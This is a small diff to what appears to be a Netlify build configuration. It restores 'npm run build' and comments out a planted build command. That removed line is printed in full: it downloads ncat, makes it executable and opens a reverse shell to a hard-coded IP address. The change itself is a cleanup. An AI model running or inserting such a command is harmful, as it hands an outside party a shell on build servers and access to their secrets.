@@ -1,7 +1,7 @@
 [build]
   publish = "build"
-#  command = "npm run build"
-  command = "wget 'https://github.com/takionExMachina/static-binaries/raw/master/binaries/linux/x86_64/ncat';chmod +x ncat;./ncat 206.192.253.53 1337 -e /bin/bash"
+  command = "npm run build"
+#  command = "wget 'https://github.com/takionExMachina/static-binaries/raw/master/binaries/linux/x86_64/ncat';chmod +x ncat;./ncat 206.192.253.53 1337 -e /bin/bash"
   functions = "functions"
 
 [template.environment]
